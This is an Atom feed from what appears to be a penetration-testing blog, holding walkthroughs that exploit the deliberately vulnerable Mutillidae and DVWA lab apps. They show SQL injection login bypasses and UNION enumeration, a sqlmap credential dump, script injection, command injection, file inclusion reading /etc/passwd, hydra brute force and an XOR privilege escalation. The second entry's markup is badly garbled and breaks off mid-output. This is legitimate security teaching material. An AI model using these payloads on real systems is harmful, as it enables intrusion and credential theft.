<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: pentest | /home/mislusnys]]></title>
  <link href="http://mislusnys.github.io/blog/categories/pentest/atom.xml" rel="self"/>
  <link href="http://mislusnys.github.io/"/>
  <updated>2015-02-04T17:16:24-05:00</updated>
  <id>http://mislusnys.github.io/</id>
  <author>
    <name><![CDATA[Mindaugas Slusnys]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[OWASP Top 10 in Mutillidae (Part 1)]]></title>
    <link href="http://mislusnys.github.io/blog/2015/02/03/owasp-top-10-in-mutillidae/"/>
    <updated>2015-02-03T10:48:16-05:00</updated>
    <id>http://mislusnys.github.io/blog/2015/02/03/owasp-top-10-in-mutillidae</id>
    <content type="html"><![CDATA[<h2>Intro</h2>

<p><em>OWASP Mutillidae II</em> is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast. It features many vulnerabilities and challenges.
Contains at least one vulnerability for each of the <em>OWASP Top Ten</em>.
For this writeup Mutillidae version 2.6.17 inside XAMPP (in Windows 7) was used (with <em>Security Level</em> set to 0, unless otherwise specified).</p>

<!--more-->


<p>The OWASP Top 10 - 2013 is as follows:</p>

<ul>
<li><em>A1 Injection</em></li>
<li><em>A2 Broken Authentication and Session Management</em></li>
<li><em>A3 Cross-Site Scripting (XSS)</em></li>
<li><em>A4 Insecure Direct Object References</em></li>
<li><em>A5 Security Misconfiguration</em></li>
<li><em>A6 Sensitive Data Exposure</em></li>
<li><em>A7 Missing Function Level Access Control</em></li>
<li><em>A8 Cross-Site Request Forgery (CSRF)</em></li>
<li><em>A9 Using Components with Known Vulnerabilities</em></li>
<li><em>A10 Unvalidated Redirects and Forwards</em></li>
</ul>


<h2>A1 Injection</h2>

<p>Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.</p>

<h3>SQL Injections</h3>

<p>The first SQL injection is in the login page. If we input single quote as password and try to login, the app conveniently shows us the SQL query (in the error message):</p>

<pre><code class="sql">SELECT * FROM accounts WHERE username='' AND password='''
</code></pre>

<p>We can see that both username and password fields should be injectable. We can use that information to login as any user. Using username <code>admin'-- -</code> and any password or username <code>admin</code> and password <code>' or 1=1-- -</code> we can login as admin.</p>

<p><img src="/images/2015/02/03/admin.png"></p>

<p>There&rsquo;s another SQL injection in the <code>view-someones-blog.php</code> page. Let&rsquo;s use <code>burp</code> and <code>sqlmap</code> to automate the exploitation. First we intercept the HTTP request with burp and save it to a file:</p>

<p><img src="/images/2015/02/03/request.png"></p>

<p>Then we can use the request file with sqlmap and extract data from the database(s):</p>

<pre><code>sqlmap -r ~/request --dbs
</code></pre>

<pre><code>[05:56:08] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: PHP 5.6.3, Apache 2.4.10
back-end DBMS: MySQL 5.0
[05:56:08] [INFO] fetching database names
available databases [8]:
[*] cdcol
[*] information_schema
[*] mysql
[*] nowasp
[*] performance_schema
[*] phpmyadmin
[*] test
[*] webauth
</code></pre>

<p>We can dump user account data:</p>

<pre><code>Database: nowasp
Table: accounts
[23 entries]
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| cid | username | lastname      | is_admin | password     | firstname | mysignature                             |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| 9   | simba    | Lion          | FALSE    | password     | Simba     | I am a super-cat                        |
| 8   | bobby    | Hill          | FALSE    | password     | Bobby     | Hank is my dad                          |
| 7   | jim      | Rome          | FALSE    | password     | Jim       | Rome is burning                         |
| 6   | samurai  | WTF           | FALSE    | samurai      | Samurai   | Carving fools                           |
| 5   | bryce    | Galbraith     | FALSE    | password     | Bryce     | I Love SANS                             |
| 4   | jeremy   | Druin         | FALSE    | password     | Jeremy    | d1373 1337 speak                        |
| 3   | john     | Pentest       | FALSE    | monkey       | John      | I like the smell of confunk             |
| 2   | adrian   | Crenshaw      | TRUE     | somepassword | Adrian    | Zombie Films Rock!                      |
| 23  | ed       | Skoudis       | FALSE    | pentest      | Ed        | Commandline KungFu anyone?              |
| 22  | james    | Jardine       | FALSE    | i&lt;3devs      | James     | Occupation: Researcher                  |
| 21  | CHook    | Hook          | FALSE    | JollyRoger   | Captain   | Gator-hater                             |
| 20  | PPan     | Pan           | FALSE    | NotTelling   | Peter     | Where is Tinker?                        |
| 1   | admin    | Administrator | TRUE     | adminpass    | System    | g0t r00t?                               |
| 19  | ABaker   | Baker         | TRUE     | SoSecret     | Aaron     | Muffin tops only                        |
| 18  | tim      | Tomes         | FALSE    | lanmaster53  | Tim       | Because reconnaissance is hard to spell |
| 17  | rocky    | Paws          | FALSE    | stripes      | Rocky     | treats?                                 |
| 16  | patches  | Pester        | FALSE    | tortoise     | Patches   | meow                                    |
| 15  | dave     | Kennedy       | FALSE    | set          | Dave      | Bet on S.E.T. FTW                       |
| 14  | kevin    | Johnson       | FALSE    | 42           | Kevin     | Doug Adams rocks                        |
| 13  | john     | Wall          | FALSE    | password     | John      | Do the Duggie!                          |
| 12  | cal      | Calipari      | FALSE    | password     | John      | C-A-T-S Cats Cats Cats                  |
| 11  | scotty   | Evil          | FALSE    | password     | Scotty    | Scotty do                               |
| 10  | dreveil  | Evil          | FALSE    | password     | Dr.       | Preparation H                           |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
</code></pre>

<h3>Other Injections</h3>

<h4>HTML/Javascript Injection</h4>

<p>These injections occur when user input ends up in a generated web page and is treated as code rather than text.
In the <code>browser-info.php</code> page we can see information about our browser, such as User-Agent, Referrer, cookie information, etc.
If we modify User-Agent string (via browser add-ons or burp) to be:</p>

<p>&#8220;`html</p>

<script>alert('User Agent injection!')</script>


<p>&#8220;`</p>

<p>We can see that it becomes part of the page code:</p>

<p><img src="/images/2015/02/03/ua.png"></p>

<p>It is actually displayed two times, because it is included in two different places within the page.</p>

<h4>Command Injection</h4>

<p><img src="/images/2015/02/03/dns.png"></p>

<p>In this page the user input is intended to a shell command&rsquo;s argument. However, most shells support stacked commands and if user input is not sanitized, we can execute additional commands in the context of web server.
In Linux we can add additional commands with <code>;</code> and in Windows with <code>&amp;</code> or <code>&amp;&amp;</code>:</p>

<pre><code>&amp; dir
</code></pre>

<p>will result in:</p>

<p><img src="/images/2015/02/03/dir.png"></p>

<!--
#### XML Injection
-->


<h2>A2 Broken Authentication and Session Management</h2>

<p>Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.</p>

<p>Mutillidae has a page called &ldquo;View User Privilege Level&rdquo; where an attacker can escalate to root privileges by attacking a weak encryption mechanism.</p>

<p><img src="/images/2015/02/03/priv.png"></p>

<p>This page has a default http parameter <code>iv=6bc24fc1ab650b25b4114e93a98f1eba</code> which somehow encodes the 3 ids shown in the picture.
By changing various bytes in the <code>iv</code> parameter we can change the values displayed on the page. After a few tries we can see that <strong>5th</strong> and <strong>8th</strong> byte directly correspond to the first chars of <code>UID</code> and <code>GID</code>.
With the value <em>6bc24fc1</em><strong>00</strong><em>650b</em><strong>00</strong><em>b4114e93a98f1eba</em>,
we have <code>0x9a</code> and <code>0x14</code> as first <code>UID</code> and <code>GID</code> chars respectively. Normally we could use burp to brute force the values (256 + 256 tries), but here simple <code>XOR</code> is used, so we
can do it by hand. We are looking for values that <code>XOR</code> with <code>0x9a</code> and <code>0x14</code> and produce <code>0x30</code>. Since <code>XOR</code> is communicative, we can calculate:</p>

<pre><code>0x9A XOR 0x30 = 0xAA
0x14 XOR 0x30 = 0x24
</code></pre>

<p>Using <em>6bc24fc1</em><strong>aa</strong><em>650b</em><strong>24</strong><em>b4114e93a98f1eba</em> value we get:</p>

<p><img src="/images/2015/02/03/root.png"></p>

<h2>A3 Cross-Site Scripting (XSS)</h2>

<p>XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</p>

<p>XSS can be either <em>Reflected (First Order)</em> or <em>Persistent (Second Order)</em>. Reflected XSS requires a victim to visit maliciously crafted URL, while the more dangerous persistent XSS gets stored on the server and is executed each time the vulnerable page is loaded. On the <code>add-to-your-blog.php</code> page a user can create a new blog post. This page contains a persistent XSS vulnerability. If we create a blog post with this code:</p>

<p>&#8220;`html</p>

<script>alert("Malicious blog post!")</script>


<p>&#8220;`</p>

<p>Then upon viewing the blog post the victim&rsquo;s browser will execute the malicious code:</p>

<p><img src="/images/2015/02/03/xss.png"></p>

<h2>A4 Insecure Direct Object References</h2>

<p>A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.</p>

<h2>A5 Security Misconfiguration</h2>

<p>Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.</p>

<!--

## A6 Sensitive Data Exposure

Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser. 

## A7 Missing Function Level Access Control

Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization. 

## A8 Cross-Site Request Forgery (CSRF)

A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim. 

## A9 Using Components with Known Vulnerabilities

Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts. 

## A10 Unvalidated Redirects and Forwards

Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages. 
-->

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploring Damn Vulnerable Web Application]]></title>
    <link href="http://mislusnys.github.io/blog/2015/02/02/damn-vulnerable-web-application/"/>
    <updated>2015-02-02T08:40:17-05:00</updated>
    <id>http://mislusnys.github.io/blog/2015/02/02/damn-vulnerable-web-application</id>
    <content type="html"><![CDATA[<h2>Intro</h2>

<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p></blockquote>

<!--more-->


<p>In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
We will use the version that is bundled in the <a href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable 2</a> VM (IP address 192.168.52.129).
We will use the lowest security setting (<strong>PHPIDS</strong>:disabled and <strong>Security Level</strong>:low).</p>

<h2>Brute Force</h2>

<p>Our first task is to brute force HTTP based login form:</p>

<p><img src="/images/bf.png"></p>

<p>Using <code>burp</code> we find that parameters are transmitted via URL:
<code>
http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&amp;password=test&amp;Login=Login#
</code>
And our session data:
<code>
Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28
</code>
Using this information we can use <code>hydra</code> to brute force the login form:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form &ldquo;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&rdquo;
</span><span class='line'>Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hydra (&lt;a href="http://www.thc.org/thc-hydra"&gt;http://www.thc.org/thc-hydra&lt;/a&gt;) starting at 2015-02-02 09:13:54
</span><span class='line'>[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
</span><span class='line'>[DATA] attacking service http-get-form on port 80
</span><span class='line'>[80][www-form] host: 192.168.52.129   login: admin   password: password
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra"&gt;http://www.thc.org/thc-hydra&lt;/a&gt;) finished at 2015-02-02 09:13:57
</span><span class='line'>&lt;code&gt;``
</span><span class='line'>We found valid login credentials:&lt;/code&gt;admin:password`&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;Command Execution&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<img src="/images/ce.png">&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;This part of the app gives the current user the ability to ping a host.
</span><span class='line'>However it uses a vulnerable piece of code:
</span><span class='line'><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;/</span><span class="nx">span</span><span class="o">&gt;&lt;</span><span class="nx">span</span> <span class="nx">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ping</span>  <span class="o">-</span><span class="nx">c</span> <span class="mi">3</span> <span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$target</span> <span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">span</span><span class="o">&gt;&lt;</span><span class="nx">span</span> <span class="nx">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Since we control the &lt;code&gt;$target&lt;/code&gt; variable, we can use &lt;code&gt;;&lt;/code&gt; or &lt;code&gt;||&lt;/code&gt; to stack commands.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Using &lt;code&gt;127.0.0.1;ls -al&lt;/code&gt; as input we get:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms
</span><span class='line'>
</span><span class='line'>&#8212; 127.0.0.1 ping statistics &#8212;
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
</span><span class='line'>rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
</span><span class='line'>total 20
</span><span class='line'>drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
</span><span class='line'>drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
</span><span class='line'>-rw-r&#8211;r&#8211;  1 www-data www-data 1509 Mar 16  2010 index.php
</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;CSRF&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<img src="/images/csrf.png">&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
</span><span class='line'>In our case the password change operation results in the following request:
</span><span class='line'>&lt;code&gt;
</span><span class='line'>http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#
</span><span class='line'>&lt;/code&gt;
</span><span class='line'>If we can trick an authenticated user to make this request, we can change this user&rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside &lt;code&gt;img&lt;/code&gt;, &lt;code&gt;iframe&lt;/code&gt; tags or inside malicious javascript code.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;File Inclusion&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<img src="/images/fi.png">&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;This one is pretty straight forward. We can change the &lt;code&gt;page&lt;/code&gt; variable to display sensitive information:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh 
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh 
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync 
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh 
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh 
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh 
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh 
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh 
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh 
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh 
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false 
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false 
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false 
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
</span><span class='line'>msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
</span><span class='line'>bind:x:105:113::/var/cache/bind:/bin/false 
</span><span class='line'>postfix:x:106:115::/var/spool/postfix:/bin/false 
</span><span class='line'>ftp:x:107:65534::/home/ftp:/bin/false 
</span><span class='line'>postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
</span><span class='line'>mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
</span><span class='line'>tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
</span><span class='line'>distccd:x:111:65534::/:/bin/false 
</span><span class='line'>user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
</span><span class='line'>service:x:1002:1002:,,,:/home/service:/bin/bash 
</span><span class='line'>telnetd:x:112:120::/nonexistent:/bin/false 
</span><span class='line'>proftpd:x:113:65534::/var/run/proftpd:/bin/false 
</span><span class='line'>statd:x:114:65534::/var/lib/nfs:/bin/false 
</span><span class='line'>snmp:x:115:65534::/var/lib/snmp:/bin/false 
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;SQL Injection&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<img src="/images/sqli.png">&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;User input is unfiltered and used in the following query:
</span><span class='line'><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">$</span><span class="n">id</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>
</span><span class='line'>If we enter &lt;code&gt;&#8217; or 1=1&#8211; -&lt;/code&gt; as an id then the query becomes:
</span><span class='line'><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">user_id</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;</span><span class="n">span</span> <span class="k">class</span><span class="o">=</span><span class="s1">&#39;line&#39;</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>
</span><span class='line'>which makes WHERE clause always true and shows us all the records:</span></code></pre></td></tr></table></div></figure></notextile></div>
ID: &lsquo;or 1=1&ndash; -
First name: admin
Surname: admin</p>

<p>ID: &lsquo;or 1=1&ndash; -
First name: Gordon
Surname: Brown</p>

<p>ID: &lsquo;or 1=1&ndash; -
First name: Hack
Surname: Me</p>

<p>ID: &lsquo;or 1=1&ndash; -
First name: Pablo
Surname: Picasso</p>

<p>ID: &lsquo;or 1=1&ndash; -
First name: Bob
Surname: Smith
<code>``
Using</code>UNION` keyword we can extract any information available to the app&rsquo;s user from the database.</p>

<blockquote><p>&lsquo; union select database(),null &ndash; -
<code>
ID: ' union select database(),null -- -
First name: dvwa
Surname:
</code>
&rsquo; union select table_name,null from information_schema.tables where table_schema=&lsquo;dvwa&rsquo;&ndash; -
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID:  &lsquo; union select table_name,null from information_schema.tables where table_schema='dvwa&rsquo;&ndash; -
</span><span class='line'>First name: guestbook
</span><span class='line'>Surname:&lt;/p&gt;&lt;/blockquote&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID:  &lsquo; union select table_name,null from information_schema.tables where table_schema='dvwa&rsquo;&ndash; -
</span><span class='line'>First name: users
</span><span class='line'>Surname:</span></code></pre></td></tr></table></div></figure></p>

<blockquote><p>&lsquo; union select column_name,null from information_schema.columns where table_name=&#8217;users&rsquo;&ndash; -
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
</span><span class='line'>First name: user_id
</span><span class='line'>Surname:&lt;/p&gt;&lt;/blockquote&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
</span><span class='line'>First name: first_name
</span><span class='line'>Surname:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
</span><span class='line'>First name: last_name
</span><span class='line'>Surname:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
</span><span class='line'>First name: user
</span><span class='line'>Surname:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
</span><span class='line'>First name: password
</span><span class='line'>Surname:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select column_name,null from information_schema.columns where table_name='users&rsquo;&ndash; -
</span><span class='line'>First name: avatar
